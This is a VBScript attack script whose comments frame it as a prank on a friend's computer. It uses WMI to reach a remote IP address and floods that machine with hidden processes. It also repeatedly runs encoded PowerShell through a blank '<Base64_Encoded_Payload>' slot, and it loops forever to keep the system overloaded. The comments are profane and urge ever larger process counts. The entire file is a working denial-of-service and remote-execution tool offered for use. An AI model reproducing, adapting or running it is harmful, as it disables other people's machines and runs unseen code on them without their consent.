' === VBScript: Aggressive System Overload & Task Flooding ===

strComputer = "YOUR_FRIEND'S_GODDAMN_IP"

Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objProcess = objWMIService.Get("Win32_Process")
Set objShell = CreateObject("WScript.Shell")


Dim processes
processes = Array("notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "taskmgr.exe", _
                  "powershell.exe -enc <Base64_Encoded_Payload>", "powershell.exe -Command Write-Host 'Task Flooding'")

processCount = 50 'I meant, you can use more like 99999999999999999999999999999999999999 idc man!!!

' === Function to Launch Multiple Processes Simultaneously ===
Sub FloodProcesses()
    For i = 1 To processCount
        
        process = processes(Int((UBound(processes) + 1) * Rnd))
        
        
        objShell.Run process, 0, False  'Lets do it silently MF!
        
        
        objProcess.Create process
        
        
        WScript.Sleep (Int(50 + (200 * Rnd)))  ' I don't want to delay MF! but anyways...
    Next
End Sub

' === Task Flooding via PowerShell for Advanced Attacks ===
Sub PowerShellFlood()
    ' Powershell is the GOAT!
    Dim psEncodedCommand
    psEncodedCommand = "powershell.exe -enc <Base64_Encoded_Payload>"  ' Do u have a payload :(

    ' Lets do it again & again MF!
    For i = 1 To 20  ' is it okay to run 20? idk man!
        objShell.Run psEncodedCommand, 0, False  ' Yo Yo I'm invisible bro
    Next
End Sub

' === Main Execution ===
FloodProcesses()     
PowerShellFlood()    

' === Optional Infinite Loop to Keep System Busy ===
Do While True
    ' Continue MF!
    FloodProcesses()
    PowerShellFlood()
Loop
